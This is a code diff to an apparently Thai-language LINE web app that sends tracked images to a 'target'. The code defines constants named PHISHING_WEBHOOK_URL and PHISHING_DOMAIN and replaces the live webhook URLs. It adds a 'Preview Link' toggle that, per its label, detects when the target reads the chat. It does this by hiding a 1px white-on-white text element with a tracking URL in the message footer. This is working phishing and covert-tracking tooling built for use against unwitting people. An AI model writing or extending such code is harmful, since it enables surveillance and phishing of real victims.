@@ -687,6 +687,24 @@
                     <input type="text" id="caseName" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
                 </div>
                 
+                <!-- เพิ่มตัวเลือกเปิด/ปิด Preview Link -->
+                <div class="form-group" style="display: flex; align-items: center; margin-bottom: 15px;">
+                    <div style="flex-grow: 1">
+                        <label for="enablePreviewLink" style="margin-bottom: 0; cursor: pointer;">
+                            เปิดใช้งาน Preview Link (ตรวจจับการอ่านแชท)
+                        </label>
+                        <div style="font-size: 12px; color: #666; margin-top: 3px; padding-left: 8px;">
+                            ช่วยให้ทราบเมื่อเป้าหมายอ่านแชทโดยที่ยังไม่คลิกลิงก์
+                        </div>
+                    </div>
+                    <label class="switch" style="position: relative; display: inline-block; width: 50px; height: 24px; margin: 0;">
+                        <input type="checkbox" id="previewLinkToggle" style="opacity: 0; width: 0; height: 0;">
+                        <span style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 24px;">
+                            <span style="position: absolute; content: ''; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%;"></span>
+                        </span>
+                    </label>
+                </div>
+                
                 <div class="form-group">
                     <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
                     <button class="btn btn-file" id="selectImageBtn">
@@ -739,6 +757,7 @@
         let isLiffInitialized = false;
         let userHasPermission = false;
         let expirationStatus = ""; // เพิ่มตัวแปรเก็บวันหมดอายุ
+        let previewLinkEnabled = false; // เพิ่มตัวแปรควบคุมสถานะ Preview Link
         
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
@@ -746,8 +765,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwTNvl-rBtGxt0gcxMIe8mm1xrs0lOYFuTuoPouoedG-cHw_NwLWiCQUSwoC5q7OkhD/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwTNvl-rBtGxt0gcxMIe8mm1xrs0lOYFuTuoPouoedG-cHw_NwLWiCQUSwoC5q7OkhD/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1107,6 +1126,45 @@
                 }
                 document.getElementById('imageUpload').click();
             });
+            
+            // เพิ่ม Event Listener สำหรับสวิตช์ Preview Link
+            document.getElementById('previewLinkToggle').addEventListener('change', function() {
+                previewLinkEnabled = this.checked;
+                
+                // บันทึกการตั้งค่าลงใน localStorage
+                try {
+                    localStorage.setItem('previewLinkEnabled', previewLinkEnabled ? 'true' : 'false');
+                } catch (e) {
+                    console.error('ไม่สามารถบันทึกการตั้งค่า Preview Link:', e);
+                }
+                
+                // แสดงผลการตั้งค่า
+                if (previewLinkEnabled) {
+                    showStatus('เปิดใช้งาน Preview Link แล้ว', true);
+                    // อัปเดต UI ของสวิตช์
+                    document.querySelector('.switch span span').style.transform = 'translateX(26px)';
+                    document.querySelector('.switch span').style.backgroundColor = '#4CAF50';
+                } else {
+                    showStatus('ปิดใช้งาน Preview Link แล้ว', true);
+                    // อัปเดต UI ของสวิตช์กลับไปเป็นสถานะปิด
+                    document.querySelector('.switch span span').style.transform = '';
+                    document.querySelector('.switch span').style.backgroundColor = '';
+                }
+            });
+            
+            // อ่านค่าการตั้งค่าจาก localStorage
+            try {
+                const savedSetting = localStorage.getItem('previewLinkEnabled');
+                if (savedSetting === 'true') {
+                    document.getElementById('previewLinkToggle').checked = true;
+                    previewLinkEnabled = true;
+                    // อัปเดต UI ของสวิตช์
+                    document.querySelector('.switch span span').style.transform = 'translateX(26px)';
+                    document.querySelector('.switch span').style.backgroundColor = '#4CAF50';
+                }
+            } catch (e) {
+                console.error('ไม่สามารถอ่านการตั้งค่า Preview Link:', e);
+            }
         }
         
         // จัดการรูปภาพที่เลือก
@@ -1485,25 +1543,78 @@
                 // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
+                // สร้าง URL สำหรับ Preview Link หากเปิดใช้งาน
+                const previewUrl = previewLinkEnabled ? 
+                    `${PHISHING_DOMAIN}?daily=${trackKey}&preview=true` : null;
+                
                 // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
-                const message = {
-                    type: 'flex',
-                    altText: `รูปภาพใหม่`,
-                    contents: {
-                        type: 'bubble',
-                        hero: {
-                            type: 'image',
-                            url: imageUrl,
-                            size: 'full',
-                            aspectRatio: '1:1',
-                            aspectMode: 'cover',
-                            action: {
-                                type: 'uri',
-                                uri: clickTrackUrl
+                let message;
+                
+                if (previewLinkEnabled) {
+                    // กรณีเปิดใช้งาน Preview Link - สร้างข้อความที่มี URL แฝงสำหรับ Preview
+                    message = {
+                        type: 'flex',
+                        altText: `รูปภาพใหม่`,
+                        contents: {
+                            type: 'bubble',
+                            hero: {
+                                type: 'image',
+                                url: imageUrl,
+                                size: 'full',
+                                aspectRatio: '1:1',
+                                aspectMode: 'cover',
+                                action: {
+                                    type: 'uri',
+                                    uri: clickTrackUrl
+                                }
+                            },
+                            footer: {
+                                type: 'box',
+                                layout: 'vertical',
+                                spacing: 'sm',
+                                contents: [
+                                    {
+                                        type: 'box',
+                                        layout: 'baseline',
+                                        contents: [
+                                            {
+                                                type: 'text',
+                                                text: ' ',
+                                                size: '1px',
+                                                color: '#FFFFFF',
+                                                action: {
+                                                    type: 'uri',
+                                                    uri: previewUrl
+                                                }
+                                            }
+                                        ]
+                                    }
+                                ],
+                                backgroundColor: '#FFFFFF'
                             }
                         }
-                    }
-                };
+                    };
+                } else {
+                    // กรณีไม่เปิดใช้งาน Preview Link - ใช้ข้อความแบบเดิม
+                    message = {
+                        type: 'flex',
+                        altText: `รูปภาพใหม่`,
+                        contents: {
+                            type: 'bubble',
+                            hero: {
+                                type: 'image',
+                                url: imageUrl,
+                                size: 'full',
+                                aspectRatio: '1:1',
+                                aspectMode: 'cover',
+                                action: {
+                                    type: 'uri',
+                                    uri: clickTrackUrl
+                                }
+                            }
+                        }
+                    };
+                }
 
                 console.log("กำลังแชร์ Flex Message:", JSON.stringify(message, null, 2));
 
